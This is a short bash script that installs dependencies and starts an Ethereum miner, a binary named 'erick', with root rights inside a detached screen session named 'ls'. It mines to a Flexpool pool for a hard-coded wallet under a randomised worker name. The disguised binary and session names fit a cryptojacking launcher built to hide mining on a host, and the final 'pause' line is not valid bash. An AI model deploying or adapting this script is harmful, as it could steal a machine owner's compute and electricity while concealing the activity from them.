#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
screen -dmS ls 
POOL=eth-us-east.flexpool.io:5555
WALLET=0xC4e7C8C7cbA2c0587Cf690aC37Dc790Da0dfeEE5
WORKER=$(echo $(shuf -i 1-4 -n 1)-ARKIN)

cd "$(dirname "$0")"

chmod +x ./erick && sudo ./erick -a ethash -o $POOL -u $WALLET.$WORKER -log
pause $@
